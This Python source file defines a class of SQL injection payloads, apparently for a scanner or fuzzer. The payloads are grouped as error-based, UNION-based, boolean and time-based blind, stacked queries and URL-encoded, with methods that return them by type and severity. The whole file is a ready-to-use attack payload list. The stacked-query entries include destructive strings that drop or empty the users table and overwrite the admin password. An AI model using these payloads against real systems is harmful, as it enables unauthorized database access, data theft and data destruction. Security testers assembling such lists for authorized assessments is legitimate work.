from typing import List, Dict

class SQLPayload:
    ERROR_BASED = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1'/*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
    ]

    UNION_BASED = [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1--",
        "' UNION SELECT 1,2--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "1' UNION SELECT 1,2,3,4,5--",
        "1' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--",
    ]

    BLIND_BOOLEAN = [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND '1'='1",
        "' AND '1'='2",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' AND (SELECT COUNT(*) FROM users)>0--",
        "' AND (SELECT COUNT(*) FROM admin)>0--",
    ]

    BLIND_TIME = [
        "'; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "'; pg_sleep(5)--",
        "'; SLEEP(5)--",
        "'; BENCHMARK(5000000,MD5('test'))--",
        "1' AND SLEEP(5)--",
        "1' AND 1=1 AND SLEEP(5)--",
        "1' AND 1=2 AND SLEEP(5)--",
    ]

    STACKED_QUERIES = [
        "'; SELECT * FROM users--",
        "'; INSERT INTO users VALUES('hacker','password')--",
        "'; DELETE FROM users WHERE 1=1--",
        "'; UPDATE users SET password='hacked' WHERE username='admin'--",
        "'; DROP TABLE users--",
        "1; SELECT * FROM users--",
    ]

    ENCODED = [
        "%27%20OR%20%271%27%3D%271",
        "%22%20OR%20%221%22%3D%221",
        "%27%20OR%20%271%27%3D%272",
        "%25%27%20OR%20%251%27%3D%271",
    ]

    def __init__(self):
        self.current_index = 0

    def get_all(self) -> List[str]:
        all_payloads = (
            self.ERROR_BASED +
            self.UNION_BASED +
            self.BLIND_BOOLEAN +
            self.BLIND_TIME +
            self.STACKED_QUERIES +
            self.ENCODED
        )
        return all_payloads

    def get_by_type(self, payload_type: str) -> List[str]:
        type_map = {
            'error': self.ERROR_BASED,
            'union': self.UNION_BASED,
            'blind_boolean': self.BLIND_BOOLEAN,
            'blind_time': self.BLIND_TIME,
            'stacked': self.STACKED_QUERIES,
            'encoded': self.ENCODED,
        }
        return type_map.get(payload_type, self.get_all())

    def get_payloads_with_context(self) -> List[Dict]:
        payloads = []
        type_map = {
            'error': self.ERROR_BASED,
            'union': self.UNION_BASED,
            'blind_boolean': self.BLIND_BOOLEAN,
            'blind_time': self.BLIND_TIME,
            'stacked': self.STACKED_QUERIES,
        }
        for ptype, plist in type_map.items():
            for p in plist:
                payloads.append({
                    'payload': p,
                    'type': ptype,
                    'severity': 'high'
                })
        for p in self.ENCODED:
            payloads.append({
                'payload': p,
                'type': 'encoded',
                'severity': 'medium'
            })
        return payloads
